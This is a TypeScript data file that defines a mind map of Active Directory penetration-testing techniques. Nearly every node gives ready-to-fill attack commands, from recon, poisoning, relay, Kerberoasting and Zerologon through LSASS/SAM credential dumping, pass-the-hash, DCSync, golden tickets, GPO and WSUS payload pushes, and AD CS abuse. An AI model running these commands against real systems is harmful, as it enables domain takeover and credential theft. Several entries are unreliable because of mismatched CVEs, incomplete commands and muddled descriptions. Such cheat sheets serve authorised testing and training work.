import { MindMapNode } from '../types';

export const mindMapData: MindMapNode = {
  name: 'Pentesting Active Directory',
  children: [
    {
      name: 'Recon & Enumeration',
      children: [
        {
          name: 'Scan Network',
          children: [
            { name: 'Enumerate SMB hosts', details: 'nmap -sn <ip_range>' },
            { name: 'Quick scan', details: 'nmap -sS -p- --min-rate 5000 -T4 -v -n -Pn <ip>' },
            { name: 'Full scan', details: 'nmap -sV -sC -p- -T4 -v -n -Pn -oA full <ip>' },
            { name: 'Find vulnerable host', details: 'nmap --script=vuln <ip>' },
          ],
        },
        {
          name: 'Find DC IP',
          children: [
            { name: 'DNS lookup', details: 'nslookup -type=all _ldap._tcp.dc._msdcs.<domain>' },
            { name: 'Zone transfer', details: 'dig axfr <domain> @<name_server>' },
          ],
        },
        {
          name: 'SMB Enumeration',
          details: 'smbclient -L \\\\<ip> -N\ncrackmapexec smb <ip> -u "" -p "" --shares\nnmap --script=smb-enum-shares -p 139,445 <ip>',
        },
        {
          name: 'LDAP Enumeration',
          details: 'ldapsearch -x -h <ip> -s base namingcontexts\nldapsearch -x -h <ip> -b "<base>"',
        },
        {
          name: 'Find User List',
          details: 'nmap -p 139,445 --script=smb-enum-users <ip>\nenum4linux -a <ip>\nimpacket-lookupsid <domain>/<user>@<dc_ip>',
        },
        {
          name: 'LLMNR / NBT-NS Poisoning',
          details: 'responder -I <interface> -v',
        },
        {
          name: 'Coerce Authentication (Petitpotam)',
          details: 'Petitpotam.py -d <domain> -u <user> -p <pass> <listener_ip> <target_ip>',
        },
        {
          name: 'Bloodhound',
          details: 'bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc_ip> -c All\nSharpHound.exe --CollectionMethod All',
        },
      ],
    },
    {
      name: 'Initial Access & Credential Gaining',
      children: [
        {
          name: 'Password Spray',
          details: "crackmapexec smb <ip_range> -u <user_file> -p '<password>' --continue-on-success",
        },
        {
          name: 'AS-REP Roasting',
          details: "impacket-GetNPUsers <domain>/ -usersfile <users_file> -format hashcat -outputfile hashes.txt",
        },
        {
          name: 'Kerberoasting',
          children: [
            {
              name: 'Get Users & TGS',
              details: "impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>\nRubeus.exe kerberoast /outfile:hashes.txt",
            },
            {
              name: 'Crack TGS',
              details: 'hashcat -m 13100 <hashes> <wordlist>\njohn --format=krb5tgs --wordlist=<wordlist> <hashes>',
            },
          ],
        },
        {
          name: 'Blind Kerberoasting (no creds)',
          details: "certipy find -u 'u@d' -p 'p' -dc-ip <dc_ip> -scheme http -vulnerable\nimpacket-GetUserSPNs -request <domain>/<user> | sed 's/\\$/@/g' > users.txt",
        },
        {
          name: 'NTLM Relay (Listen and relay)',
          children: [
              { name: 'SMB -> LDAP/S', details: 'ntlmrelayx.py -t ldaps://<dc_ip> --add-computer "RELAYED$" --add-computer-pass "pass123"'},
              { name: 'HTTP -> LDAP', details: 'ntlmrelayx.py -t ldap://<dc_ip> -smb2support'},
              { name: 'Coerce Authentication', details: 'Run responder/Petitpotam to get hashes'}
          ]
        },
        {
          name: 'Known Vulnerabilities',
          children: [
            { name: 'Zerologon (CVE-2020-1472)', details: 'impacket-secretsdump <domain>/<DC_name>\\$@<DC_ip> -no-pass' },
            { name: 'EternalBlue (MS17-010)', details: 'use exploit/windows/smb/ms17_010_eternalblue' },
            { name: 'PrintNightmare (CVE-2021-34527)', details: 'python3 CVE-2021-1675.py <domain>/<user>:<password>@<ip>' },
            { name: 'samaccountname spoofing (CVE-2021-42278)', details: "addcomputer.py -computer-name 'DC_NAME$' -computer-pass 'pass123' <domain>/<user>:<password>" },
          ]
        }
      ],
    },
    {
      name: 'Privilege Escalation',
      children: [
        { name: 'Get Application Info', details: 'Get-Childitem -path "C:\\Program Files" -include *.exe -recurse' },
        { name: 'Unquoted Service Path', details: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """' },
        { name: 'Search Password Files', details: 'findstr /si password *.txt *.ini *.xml' },
        { name: 'AppLocker (unlimiting) bypass', details: 'rundll32.exe C:\\Windows\\Tasks' },
        { name: 'KRBRelayUp (CVE-2022-26923)', details: 'KRBRelayUp.exe -d <domain> -m ADD -p <new_pass>' },
        { name: 'ACL Abuse', details: 'Find objects with weak permissions using Bloodhound or manually.' },
        { name: 'GPO Abuse (Write on GPO)', details: 'New-GPOImmediateTask -TaskName "evil" -SysPath "\\\\<domain>\\SysVol\\..." -Command "c:\\evil.exe"' },
      ],
    },
    {
      name: 'Lateral Movement',
      children: [
        {
          name: 'Pass the Hash (PtH)',
          details: "impacket-psexec -hashes <lm_hash>:<nt_hash> <user>@<target_ip>\ncrackmapexec smb <target_ip> -u <user> -H <nt_hash> -x 'whoami'",
        },
        {
          name: 'Pass the Ticket (PtT)',
          details: 'Rubeus.exe ptt /ticket:<base64_ticket>\nmimikatz # kerberos::ptt <ticket.kirbi>',
        },
        {
          name: 'Over-Pass the Hash',
          details: 'mimikatz # sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash>',
        },
        {
          name: 'From Compromised WSUS Server',
          details: 'SharpWSUS /C: "Create" /A: "Admin" /T: "@<target_group>" /CMD: "powershell.exe -enc <base64_payload>"',
        },
        {
          name: 'Remote Execution Tools',
          children: [
            { name: 'PsExec', details: 'impacket-psexec <domain>/<user>:<pass>@<target_ip>' },
            { name: 'WMIexec', details: 'impacket-wmiexec <domain>/<user>:<pass>@<target_ip>' },
            { name: 'SMBexec', details: 'impacket-smbexec <domain>/<user>:<pass>@<target_ip>' },
            { name: 'WinRM / Evil-WinRM', details: 'evil-winrm -i <target_ip> -u <user> -p <pass>' },
          ],
        },
      ],
    },
    {
        name: 'Credential Dumping',
        children: [
            { name: 'Extract from LSASS', details: 'procdump64.exe -ma lsass.exe lsass.dmp\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords' },
            { name: 'Extract from SAM', details: 'reg.exe save hklm\\sam sam.save\nreg.exe save hklm\\system system.save\nimpacket-secretsdump -sam sam.save -system system.save LOCAL'},
            { name: 'Extract from LSA', details: 'impacket-secretsdump -security security.save -system system.save LOCAL'},
            { name: 'Search stored passwords', details: 'LaZagne.exe all'},
            { name: 'Token manipulation', details: 'mimikatz # privilege::debug\nmimikatz # token::impersonate /user:<user>'},
        ]
    },
    {
      name: 'Domain Dominance',
      children: [
        { name: 'DCSync', details: 'mimikatz # lsadump::dcsync /user:<domain>\\krbtgt' },
        { name: 'Dump NTDS.dit', details: 'impacket-secretsdump -just-dc-ntlm <domain>/<user>:<pass>@<dc_ip>' },
        { name: 'Delegation Abuse',
          children: [
            { name: 'Unconstrained', details: 'Find machines with TrustedForDelegation flag. If compromised, can impersonate users connecting to it.' },
            { name: 'Constrained (KCD)', details: "impacket-getST -spn <service/host> -impersonate <user_to_impersonate> <domain>/<user_with_deleg>:<pass>" },
            { name: 'Resource-Based Constrained (RBCD)', details: "rbcd.py -action write -delegate-to <target_computer> -delegate-from <attacker_controlled_acc> -dc-ip <dc_ip> <domain>/<user>" },
          ]
        },
        {
          name: 'Trust Relationship Abuse',
          children: [
            { name: 'Enumerate Trusts', details: 'Get-DomainTrust -Domain <domain>\nGet-ForestTrust -Forest <forest>' },
            { name: 'Child Domain to Forest Compromise', details: 'mimikatz # lsadump::dcsync /user:<forest_root_domain>\\krbtgt /domain:<child_domain>' },
          ]
        },
      ],
    },
    {
      name: 'Persistence',
      children: [
        { name: 'Golden Ticket', details: 'mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500' },
        { name: 'Silver Ticket', details: 'mimikatz # kerberos::golden /user:user /domain:<domain> /sid:<domain_sid> /target:<server_fqdn> /service:<service> /rc4:<service_acc_hash> /id:1105' },
        { name: 'DCShadow', details: 'mimikatz # lsadump::dcshadow /object:CN=victim,CN=Users,DC=... /attribute:primaryGroupID /value:512' },
        { name: 'AdminSDHolder', details: 'Modify permissions on AdminSDHolder to grant persistent rights over privileged groups.' },
        { name: 'DSRM (Directory Service Restore Mode)', details: 'mimikatz # lsadump::lsa /patch' },
        { name: 'Custom SSP', details: 'mimikatz # misc::memssp' },
      ],
    },
    {
      name: 'AD CS (Certificate Services) Abuse',
      children: [
        { name: 'Find Vulnerable Templates', details: 'certipy find -vulnerable -u <user>@<domain> -p <pass> -dc-ip <dc_ip>' },
        { name: 'ESC1 (Misconfigured Template Permissions)', details: 'Allows low-priv user to request a cert for a privileged user (e.g., Domain Admin).\ncertipy req -u <user> -p <pass> -ca <ca_name> -template <template_name> -target <dc_ip>' },
        { name: 'ESC2 (Template allows any subject)', details: 'certipy req -u <user> -p <pass> -ca <ca_name> -template <template_name> -upn <admin_upn> -target <dc_ip>' },
        { name: 'ESC3 (Misconfigured Enrollment Agent)', details: 'Request enrollment agent cert, then use it to request cert on behalf of a privileged user.' },
        { name: 'ESC4 (Vulnerable ACL on Template)', details: 'Modify template to become vulnerable to ESC1/ESC2.' },
        { name: 'ESC6 (Vulnerable ACL on CA)', details: 'Modify CA settings to enable vulnerable options.' },
        { name: 'ESC10 (Weak Certificate Mappping)', details: 'Roast account UPN based on certificate mapping.' },
        {
          name: 'Authenticate with Certificate',
          details: 'certipy auth -pfx <cert.pfx> -dc-ip <dc_ip>',
        },
      ],
    },
  ],
};
